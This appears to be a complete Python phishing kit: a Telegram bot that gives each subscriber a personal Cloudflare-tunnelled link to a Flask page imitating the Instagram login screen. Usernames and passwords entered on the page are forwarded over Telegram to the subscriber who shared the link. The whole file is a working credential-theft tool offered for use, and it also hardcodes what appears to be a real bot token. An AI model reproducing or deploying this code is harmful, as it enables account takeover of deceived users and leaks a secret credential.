import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from flask import Flask, request, render_template_string
from threading import Thread
import subprocess
import re
import time
import os

BOT_TOKEN = "8257800850:AAFtaSfrQrak-ZYv8PTjA9QiuYDF8TrmsSU"
bot = telebot.TeleBot(BOT_TOKEN)

CHANNEL = "@python_kodra"

# ==================== MAJBURIY OBUNA ====================
def check_sub(user_id):
    try:
        res = bot.get_chat_member(CHANNEL, user_id)
        return res.status in ["member", "administrator", "creator"]
    except:
        return False


# ==================== CLOUDFLARED ====================

PUBLIC_URL = None

def run_cloudflared():
    global PUBLIC_URL

    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    for line in process.stdout:
        print(line.strip())

        match = re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if match:
            PUBLIC_URL = match.group(0)
            print("FOUND URL:", PUBLIC_URL)
            break


# ==================== FLASK ====================

app = Flask(__name__)

html_form = """
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Inter", sans-serif;
    }
    body {
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 360px;
      padding: 20px;
      text-align: center;
    }

    .lang {
      font-size: 14px;
      color: #999;
      margin-bottom: 30px;
    }

    .logo {
      width: 80px;
      margin-bottom: 25px;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    input {
      padding: 12px;
      border: 1px solid #dbdbdb;
      border-radius: 6px;
      font-size: 14px;
      background-color: #fafafa;
      outline: none;
      transition: border 0.2s ease;
    }

    input:focus {
      border-color: #a8a8a8;
    }

    .login-btn {
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 10px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.3s ease;
      margin-top: 5px;
    }

    .login-btn:hover {
      background-color: #007ace;
    }

    .forgot {
      margin-top: 15px;
      font-size: 13px;
      color: #00376b;
      text-decoration: none;
    }

    .divider {
      margin: 25px 0;
      border-top: 1px solid #dbdbdb;
    }

    .create-account {
      display: block;
      width: 100%;
      border: 1px solid #dbdbdb;
      background-color: transparent;
      border-radius: 8px;
      padding: 10px;
      font-weight: 500;
      cursor: pointer;
      color: #0095f6;
      text-decoration: none;
      transition: all 0.3s ease;
    }

    .create-account:hover {
      background-color: #f3f9ff;
    }

    .meta {
      margin-top: 30px;
      font-size: 13px;
      color: #8e8e8e;
    }

    .meta-logo {
      width: 22px;
      vertical-align: middle;
      margin-right: 5px;
    }

    @media (max-width: 400px) {
      .container {
        max-width: 90%;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="lang">English (US)</div>
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">

    <!-- METHOD va name atributlari qo'shildi -->
    <form method="POST">
      <input type="text" name="username" placeholder="Username, email or mobile number" required>
      <input type="password" name="password" placeholder="Password" required>
      <button class="login-btn" type="submit">Log in</button>
    </form>

    <a href="#" class="forgot">Forgot password?</a>

    <div class="divider"></div>

    <a href="#" class="create-account">Create new account</a>

    <div class="meta">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-logo">
      Meta
    </div>
  </div>
</body>
</html>
"""

@app.route("/form/<user_id>", methods=["GET", "POST"])
def form(user_id):
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        bot.send_message(
            user_id,
            f"🔔 Sizning linkingizga ma'lumot yuborildi!\n\n👤 Username: {username}\n🔑 Password: {password}"
        )
        return "Success!"

    return render_template_string(html_form)


# ==================== TELEGRAM BOT ====================

@bot.message_handler(commands=["start"])
def start(msg):
    bot.send_message(msg.chat.id, "Salom! /link buyrug‘ini yuboring.")


@bot.message_handler(commands=["link"])
def link(msg):
    user_id = msg.chat.id

    # Majburiy obuna
    if not check_sub(user_id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔗 Kanalga o'tish", url=f"https://t.me/{CHANNEL.replace('@','')}"))
        bot.send_message(
            user_id,
            "❗ Iltimos, avval kanalga obuna bo‘ling!",
            reply_markup=markup
        )
        return

    # Cloudflare URL hali tayyor emas
    if not PUBLIC_URL:
        bot.send_message(user_id, "⏳ Cloudflare URL tayyorlanmoqda... 2-3 sekund kuting va qayta /link yuboring.")
        return

    # Foydalanuvchi uchun shaxsiy link
    uniq = f"{PUBLIC_URL}/form/{user_id}"

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 Mening linking", url=uniq))

    bot.send_message(
        user_id,
        f"🔗 Sizning shaxsiy linkingiz tayyor:\n\n{uniq}",
        reply_markup=markup
    )


# ==================== THREADLARNI ISHGA TUSHIRISH ====================

def run_flask():
    app.run(host="0.0.0.0", port=5000)


Thread(target=run_cloudflared).start()
time.sleep(2)
Thread(target=run_flask).start()

bot.polling(none_stop=True)
